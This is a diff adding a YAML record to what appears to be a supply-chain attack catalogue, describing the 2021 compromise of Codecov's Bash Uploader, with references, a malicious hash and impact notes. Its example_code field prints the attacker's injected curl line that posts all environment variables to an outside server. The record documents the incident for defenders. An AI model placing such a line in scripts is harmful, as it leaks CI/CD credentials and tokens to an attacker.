@@ -1,0 +1,36 @@
+- name: Codecov Bash Uploader
+  title: Codecov Bash Uploader script modified, stealing CI/CD environment variables.
+  start_date: 2021-01-31
+  end_date: 2021-04-01
+  license: Apache-2.0
+  website: https://about.codecov.io/
+  repo: https://github.com/codecov/codecov-bash
+  attribution_type: unknown
+  component_type: Tool
+  lang: Shell
+  cause: compromise
+  motive: Credential theft, Espionage
+  attack_vector: CI/CD compromise
+  transitive: false
+  insertion_phase: distribution
+  impact_type: Credential theft
+  references:
+    - https://about.codecov.io/security-update/
+    - https://www.cisa.gov/news-events/alerts/2021/04/30/codecov-releases-new-detections-supply-chain-compromise
+    - https://www.sapphire.net/blogs-press-releases/bash-uploader-compromised-supply-chain/
+  artifacts:
+    - https://codecov.io/bash # URL serving the modified script during incident period
+  impacted_hashes:
+    - cc57a54985133b0303b7c95b068859a039ff390067134704834163663cd09905 # SHA256 of one known malicious version
+  synopsis: |
+    Attackers compromised Codecov's infrastructure used to build Docker images. This allowed them to modify the Bash Uploader script served to users, exfiltrating environment variables from CI/CD systems.
+  compromise_desc: |
+    The attackers obtained credentials for a Google Cloud Storage (GCS) key used in Codecov's Docker image build process. This allowed them to modify the `codecov.sh` (Bash Uploader) script as it was being built into the official Docker image and likely also directly modify the version served from codecov.io. The modification was subtle, adding one line to exfiltrate data.
+  impact_desc: |
+    The modified Bash Uploader script collected environment variables present in the user's CI/CD execution environment (which often contain sensitive credentials, tokens, and keys) and sent them to an attacker-controlled server (`http://104.248.9.144/upload/`). This allowed widespread credential theft from Codecov users integrating the script into their CI/CD pipelines.
+  example_code: |
+    ```bash
+    # Single line added to the legitimate codecov.sh script by the attacker
+    # This line sends all environment variables to the attacker's server
+    curl -sm 0.5 -d "$(env)" [http://104.248.9.144/upload/](http://104.248.9.144/upload/) || true
+    ```
